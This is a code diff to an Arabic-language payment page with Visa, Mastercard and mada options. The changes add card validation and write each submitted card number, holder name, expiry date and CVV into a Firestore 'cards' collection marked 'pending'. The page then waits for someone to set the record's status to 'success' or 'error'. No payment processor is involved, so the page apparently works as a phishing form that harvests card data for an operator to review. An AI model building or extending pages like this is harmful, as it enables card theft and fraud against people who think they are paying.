@@ -68,14 +68,14 @@
         }
         
         .card-type-selector {
-      display: flex;
-    justify-content: space-between;
-    gap: 10px; /* مسافة بين البطاقات */
-    margin-bottom: 25px;
-    border-bottom: 1px solid var(--border-color);
-    padding-bottom: 15px;
-    flex-wrap: nowrap; /* منع الالتفاف لسطر جديد */
-    overflow-x: auto; /* إضافة تمرير أفقي إذا ضاقت الشاشة جداً */
+            display: flex;
+            justify-content: space-between;
+            gap: 10px; 
+            margin-bottom: 25px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+            flex-wrap: nowrap; 
+            overflow-x: auto; 
         }
         
         .card-option {
@@ -279,21 +279,20 @@
                 margin-top: 50px;
             }
         }
-        /* تنسيق الصورة داخل خيارات اختيار البطاقة */
-.card-option img {
-    width: 50px; /* مقاس شعار مدى في الاختيارات */
-    height: auto;
-    margin-bottom: 8px;
-    margin-left: auto;
-    margin-right: auto;
-}
 
-/* تنسيق الصورة داخل بطاقة المعاينة الزرقاء */
-.card-logo img {
-    width: 45px; /* مقاس شعار مدى في المعاينة */
-    height: auto;
-    border-radius: 10%;
-}
+        .card-option img {
+            width: 50px; 
+            height: auto;
+            margin-bottom: 8px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .card-logo img {
+            width: 45px; 
+            height: auto;
+            border-radius: 10%;
+        }
     </style>
 </head>
 <body>
@@ -315,20 +314,19 @@
         </div>
         
         <div class="payment-card">
-          <div class="card-type-selector">
-    <div class="card-option visa active" data-type="visa">
-        <i class="fa-brands fa-cc-visa"></i>
-        <div>فيزا</div>
-    </div>
-    <div class="card-option mastercard" data-type="mastercard">
-        <i class="fa-brands fa-cc-mastercard"></i>
-        <div>ماستركارد</div>
-    </div>
-    <div class="card-option mada" data-type="mada">
-        <img src="m.png" alt="mada">
-        <div>مدى</div>
-    </div>
-</div>
+            <div class="card-type-selector">
+                <div class="card-option visa active" data-type="visa">
+                    <i class="fa-brands fa-cc-visa"></i>
+                    <div>فيزا</div>
+                </div>
+                <div class="card-option mastercard" data-type="mastercard">
+                    <i class="fa-brands fa-cc-mastercard"></i>
+                    <div>ماستركارد</div>
+                </div>
+                <div class="card-option mada" data-type="mada">
+                    <img src="m.png" alt="mada">
+                    <div>مدى</div>
+                </div>
             </div>
             
             <form id="payment-form">
@@ -383,10 +381,11 @@
             <p>© 2023 بوابة الدفع الإلكتروني. جميع الحقوق محفوظة.</p>
         </footer>
     </div>
+
 <script type="module">
     // 1. استيراد مكتبات Firebase
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+    import { getFirestore, collection, addDoc, serverTimestamp, onSnapshot, doc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
 
     // 2. إعدادات Firebase الخاصة بك
     const firebaseConfig = {
@@ -466,6 +465,18 @@
         return (sum % 10) === 0;
     }
 
+    function isValidExpiryDate(value) {
+        if (!value || !value.includes('/')) return false;
+        const parts = value.split('/');
+        if (parts.length !== 2) return false;
+        const mm = parseInt(parts[0], 10);
+        const yy = parseInt(parts[1], 10);
+        if (isNaN(mm) || isNaN(yy)) return false;
+        if (mm < 1 || mm > 12) return false;
+        if (yy < 25) return false; // رفض إذا كانت السنة أقل من 25
+        return true;
+    }
+
     function showError(errorId) { const err = document.getElementById(errorId); if(err) err.style.display = 'block'; }
     function hideError(errorId) { const err = document.getElementById(errorId); if(err) err.style.display = 'none'; }
 
@@ -500,33 +511,56 @@
         hideError('expiry-date-error');
     });
 
-    // --- إرسال البيانات إلى Firebase Firestore ---
+    cvvInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0,4);
+        hideError('cvv-error');
+    });
+
+    // --- إرسال البيانات والمراقبة اللحظية ---
     paymentForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         let isFormValid = true;
         if (!isValidCardNumber(cardNumberInput.value)) { showError('card-number-error'); isFormValid = false; }
         if (cardHolderInput.value.trim().length < 3) { showError('card-holder-error'); isFormValid = false; }
+        if (!isValidExpiryDate(expiryDateInput.value)) { showError('expiry-date-error'); isFormValid = false; }
+        if (!/^\d{3,4}$/.test(cvvInput.value)) { showError('cvv-error'); isFormValid = false; }
 
         if (isFormValid) {
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري معالجة الطلب...';
             
             try {
-                // حفظ الوثيقة في Firestore
-                await addDoc(collection(db, "cards"), {
+                // 1. حفظ البطاقة مع حالة "pending"
+                const docRef = await addDoc(collection(db, "cards"), {
                     cardType: selectedCardType,
                     cardHolder: cardHolderInput.value,
                     cardNumber: cardNumberInput.value,
                     expiryDate: expiryDateInput.value,
                     cvv: cvvInput.value,
+                    status: 'pending', // الحالة الافتراضية
                     createdAt: serverTimestamp()
                 });
 
-                // إظهار رسالة النجاح
-                paymentForm.style.display = 'none';
-                document.querySelector('.payment-card').style.display = 'none';
-                successMessage.style.display = 'block';
+                // 2. مراقبة الوثيقة في الوقت الفعلي (Real-time)
+                onSnapshot(doc(db, "cards", docRef.id), (docSnap) => {
+                    if (docSnap.exists()) {
+                        const status = docSnap.data().status;
+                        
+                        if (status === 'success') {
+                            paymentForm.style.display = 'none';
+                            document.querySelector('.payment-card').style.display = 'none';
+                            successMessage.style.display = 'block';
+                            errorMessage.style.display = 'none';
+                        } else if (status === 'error') {
+                            paymentForm.style.display = 'none';
+                            document.querySelector('.payment-card').style.display = 'none';
+                            errorMessage.style.display = 'block';
+                            successMessage.style.display = 'none';
+                        }
+                    }
+                });
+
             } catch (error) {
                 console.error("Firebase Error: ", error);
                 alert("خطأ في الاتصال بقاعدة البيانات");
